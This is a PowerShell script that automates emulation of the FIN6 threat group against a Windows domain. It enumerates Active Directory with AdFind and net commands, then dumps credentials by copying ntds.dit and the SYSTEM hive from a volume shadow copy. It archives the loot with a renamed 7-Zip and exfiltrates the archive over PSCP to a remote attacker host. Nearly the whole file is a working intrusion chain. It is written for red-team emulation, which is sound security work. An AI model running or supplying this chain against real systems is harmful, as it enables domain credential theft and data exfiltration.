<#
.NOTES
    Author:  @kengentenerende

    Summary: Powershell Script to Automate Adversary Emulation of FIN6 APT.
    
    Usage Examples:
    
        .\FIN6_automation.ps1 -u kali -ip XXX.XXX.XXX.XXX -pkey [path_to_private_key].ppk

.PARAMETER -u
     Username of the Remote Server.

.PARAMETER -ip
     IP Address of the Remote Server.

.PARAMETER -pkey
     The path to the private key file in .ppk format.
#>

param(
    [Parameter(Mandatory=$true)][string]$u,
    [Parameter(Mandatory=$true)][string]$ip,
    [Parameter(Mandatory=$true)][string]$pkey
)


$resultHost = $u+"@"+$ip
$currentDir = $PWD
function Get-Param{
param(
    [string]$u,
    [string]$ip,
    [string]$pkey
)
    "Machine Username: $u"
    "Machine IP Address: $ip"
    "SSH Private Key: $pkey"
    "Hostname: $resultHost"

}

Get-Param @PSBoundParameters

#Download AdFind to Windows directory
function Get-AdFind{
$postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Body $postParams -OutFile C:\Users\Public\adfind.zip;
Expand-Archive -Path C:\Users\Public\adfind.zip -DestinationPath C:\Users\Public -Force;
Move-Item -Path C:\Users\Public\AdFind.exe -Destination C:\Windows\AdFind.exe -Force;
Remove-Item -Path C:\Users\Public\adfind.zip -Force;
Remove-Item -Path C:\Users\Public\adcsv.pl -Force;
Write-Host "[+] Downloaded AdFind to Windows directory" -ForegroundColor Green;
}

# List of ad_* Files
function Get-AdContainer{
$adfilePaths = @(
".\ad_users.txt",
".\ad_users_alt.txt",
".\ad_computers.txt",
".\ad_computers_alt.txt",
".\ad_ous.txt",
".\ad_ous_alt.txt",
".\ad_trustdmp.txt",
".\ad_trustdmp_alt.txt",
".\ad_subnets.txt",
".\ad_subnets_alt.txt",
".\ad_group.txt",
".\ad_group_alt.txt"
)

#Overwrite existing files
foreach ($aditem in $adfilePaths){
    if (Test-Path $aditem){
    Set-Content -Path $aditem -Value "This File is overwritten"
    Write-Host "File overwritten at $aditem"
    } else{
        New-Item -Path $aditem 
        Write-Host "File created at $aditem"
    }
}

Write-Host "`n[+] File Container Creation Completed]" -ForegroundColor Green;
}

# Account Discovery: Domain Account (T1087.002)
function Get-DomainAccount{
Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=person) > ad_users.txt";
Write-Host "`n[+] Person Objects Discovery Completed: [FIN6]" -ForegroundColor Green;
Get-Content ad_users.txt | Select-String "dn:CN=";


net user /domain > ad_users_alt.txt;
Write-Host "`n[+] Person Objects Discovery Completed: [Alternative]" -ForegroundColor Green;
type ad_users_alt.txt;
}

# Remote System Discovery (T1018)
function Get-RemoteSystem{
Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=computer) > ad_computers.txt";
Write-Host "`n[+] Workstation and Server Discovery Completed: [FIN6]" -ForegroundColor Green;
Get-Content ad_computers.txt | Select-String "dn:CN=";

net group "Domain Computers" /domain > ad_computers_alt.txt
Write-Host "`n[+] Workstation and Server Discovery Completed: [Alternative]" -ForegroundColor Green;
type ad_computers_alt.txt;
}

# Domain Trust Discovery (T1482)
function Get-DomainTrust{
Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=organizationalUnit) > ad_ous.txt";
Write-Host "`n[+] Organizational Units (OUs) Discovery Completed: [FIN6]" -ForegroundColor Green;
Get-Content ad_ous.txt | Select-String "dn:OU=";

Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A > ad_ous_alt.txt;
Write-Host "`n[+] Organizational Units (OUs) Discovery Completed: [Alternative]" -ForegroundColor Green;
type ad_ous_alt.txt;
}

# Domain Trust Discovery - Full Forest(T1482)
function Get-ForestDomainTrust{
Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -gcb -sc trustdmp > ad_trustdmp.txt";
Write-Host "`n[+] Full Forest Organizational Units (OUs) Discovery Completed: [FIN6]" -ForegroundColor Green;
Get-Content ad_trustdmp.txt | Select-String "Using server:";


nltest /domain_trusts > ad_trustdmp_alt.txt
Write-Host "`n[+] Full Forest Organizational Units (OUs) Discovery Completed: [Alternative]" -ForegroundColor Green;
type ad_trustdmp_alt.txt;
}

# System Network Configuration Discovery (T1016)
function Get-SystemNet{
Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -subnets -f (objectcategory=subnet) > ad_subnets.txt";
Write-Host "`n[+] Subnet Discovery Completed: [FIN6]" -ForegroundColor Green;
Get-Content ad_subnets.txt

Get-ADReplicationSubnet -Filter * > ad_subnets_alt.txt
Write-Host "`n[+] Subnet Discovery Completed: [Alternative]" -ForegroundColor Green;
type ad_subnets_alt.txt;
}

# Permission Groups Discovery: Domain Groups (T1069.002)
function Get-GroupPerm{
Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=group) > ad_group.txt";
Write-Host "`n[+] Permission Groups Discovery Completed: [FIN6]" -ForegroundColor Green;
Get-Content ad_group.txt

net group /domain > ad_group_alt.txt
Write-Host "`n[+] Permission Groups Discovery Completed: [Alternative]" -ForegroundColor Green;
type ad_group_alt.txt;
}

function Get-OSCredDump{
#Get Shadow Copy
$processInfo = New-Object System.Diagnostics.ProcessStartInfo
$processInfo.Filename = "cmd.exe"
$processInfo.Arguments = "/c vssadmin create shadow /For=%SYSTEMDRIVE%";
$processInfo.RedirectStandardOutput = $true
$processInfo.RedirectStandardError = $true
$processInfo.UseShellExecute = $false
$osshadPath = "./ad_osshadow.txt"

$process = [System.Diagnostics.Process]::Start($processInfo)
$process.WaitForExit()

$output_oscred = $process.StandardOutput.ReadToEnd()
$errorOutput_oscred = $process.StandardError.ReadToEnd()

Write-Host "`nStandard Output:"
Write-Host $output_oscred
Write-Host "`nStandard Error:"
Write-Host $errorOutput_oscred

#Save Shadow Copy
$osshad_result = $output_oscred | Set-Content -Path $osshadPath;

#OS Credential Dumping: NTDS (T1003.003)
$osshad_replace = 'Shadow Copy Volume Name: '
$osshadname_result = Get-Content ad_osshadow.txt | Select-String -Pattern "Shadow Copy Volume Name:" | ForEach {
$_.Line -replace $osshad_replace, ' '};

#Save output
$osdumpPaths = @(
".\ad_ntds.dit",
".\ad_SYS_reg",
".\ad_SYSTEM_cfg"
)

#Overwrite existing files
foreach ($osdump in $osdumpPaths){
    if (Test-Path $osdump){
    Remove-Item -Path $osdump -Force
    Write-Host "File deleted: $osdump"
    } else{
        Write-Host "File not found: $osdump"
    }
}
Start-Process -FilePath "cmd" -ArgumentList "/c copy $osshadname_result\windows\ntds\ntds.dit .\ad_ntds.dit";
Write-Host "`n[+] NTDS Discovery Completed: [FIN6]" -ForegroundColor Green;
Start-Process -FilePath "cmd" -ArgumentList "/c reg SAVE HKLM\SYSTEM .\ad_SYS_reg";
Write-Host "`n[+] System Registy Hive Discovery Completed: [FIN6]" -ForegroundColor Green;
Start-Process -FilePath "cmd" -ArgumentList "/c copy $osshadname_result\windows\system32\config\SYSTEM .\ad_SYSTEM_cfg";
Write-Host "`n[+] System Configuration Discovery Completed: [FIN6]" -ForegroundColor Green;

Write-Host "`n[+] OS Credential Discovery Completed: [FIN6]" -ForegroundColor Green;
}


function Get-CollectArc{
# Download 7zip
Invoke-WebRequest -Uri https://www.7-zip.org/a/7z2301-x64.exe -OutFile .\7.exe
Start-Process -FilePath "cmd" -ArgumentList "/c 7.exe /S";
Remove-Item -Path .\7.exe -Force;
Write-Host "`n[+] 7zip Download Completed: [FIN6]" -ForegroundColor Green;

# Rename 7z file
Copy-Item "C:\Program Files\7-Zip\7z.exe" -Force -Recurse;
Rename-Item -Path ".\7z.exe" -NewName "7.exe"-Force;
Write-Host "`n[+] 7zip Renaming Completed: [FIN6]" -ForegroundColor Green;

# Archive Collected Data: Archive via Utility (T1560.001)

$processInfo = New-Object System.Diagnostics.ProcessStartInfo
$processInfo.Filename = "cmd.exe"
$processInfo.Arguments = "/c $currentDir\7.exe a -mx3 $currentDir\ad.7z ad_*";
#Start-Process -FilePath "cmd" -ArgumentList "/c '7.exe' a -mx3 ad.7z ad_*";
$processInfo.RedirectStandardOutput = $true
$processInfo.RedirectStandardError = $true
$processInfo.UseShellExecute = $false
$process = [System.Diagnostics.Process]::Start($processInfo)
$process.WaitForExit()

$output_arc = $process.StandardOutput.ReadToEnd()
$errorOutput_arc = $process.StandardError.ReadToEnd()

Write-Host "`nArchive Colle Output:"
Write-Host $output_arc
Write-Host "`nStandard Error:"
Write-Host $errorOutput_arc

Write-Host "`n[+] Archive Collection Completed: [FIN6]" -ForegroundColor Green;
}

function Get-ExfilPscp{
# Download PSCP
$finalHost = $resultHost+":"
Write-Host "`n[+] FinalHost: $finalHost" -ForegroundColor Red;
Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
Write-Host "`n[+] PSCP Download Completed: [FIN6]" -ForegroundColor Green;

# Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)
$processInfo = New-Object System.Diagnostics.ProcessStartInfo
$processInfo.Filename = "cmd.exe"
$processInfo.Arguments = "/c $currentDir\pscp.exe -i $pkey -P 22 $currentDir\ad.7z $finalHost/home/$u/Desktop";
#Start-Process -FilePath "cmd" -ArgumentList "/c .\pscp.exe -i $pkey -P 22 .\ad.7z $finalHost/home/$u/Desktop";
$processInfo.RedirectStandardOutput = $true
$processInfo.RedirectStandardError = $true
$processInfo.UseShellExecute = $false
$process = [System.Diagnostics.Process]::Start($processInfo)
$process.WaitForExit()

$output = $process.StandardOutput.ReadToEnd()
$errorOutput = $process.StandardError.ReadToEnd()

Write-Host "`nStandard Output:"
Write-Host $output
Write-Host "`nStandard Error:"
Write-Host $errorOutput

#--------------------------------------------------------------------------------------------------------
#
# If private key file (.ppk) is not available, you may use the following command.
# You need to manually supply the password of Remote Server on PSCP.
#
#    Start-Process -FilePath "cmd" -ArgumentList "/c pscp.exe -P 22 .\ad.7z $finalHost/home/$u/Desktop";
#
#--------------------------------------------------------------------------------------------------------

Write-Host "`n[+] Exfiltration Using PSCP Completed: [Alternative]" -ForegroundColor Green;
}


# UNCOMMENT TO RUN FUNCTIONS HERE

#Get-AdContainer
#Get-AdFind
#Get-DomainAccount
#Get-RemoteSystem
#Get-DomainTrust
#Get-ForestDomainTrust
#Get-SystemNet
#Get-GroupPerm
#Get-OSCredDump
#Get-CollectArc
#Get-ExfilPscp

Write-Host "`n[+] Operation Complete" -ForegroundColor Green;
